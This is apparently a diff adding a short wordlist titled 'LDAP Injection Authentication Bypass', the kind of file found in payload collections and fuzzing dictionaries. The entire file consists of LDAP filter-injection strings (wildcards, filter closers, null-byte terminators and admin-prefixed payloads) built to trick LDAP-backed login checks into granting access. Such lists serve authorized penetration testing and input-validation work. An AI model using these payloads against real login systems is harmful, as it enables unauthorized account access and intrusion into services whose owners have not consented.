@@ -1,0 +1,12 @@
+# LDAP Injection Authentication Bypass
+*
+*)(&
+*)(|(&
+pwd)
+*)(|(*
+*))%00
+admin)(&)
+pwd
+admin)(!(|(&
+pwd))
+admin))(|(|
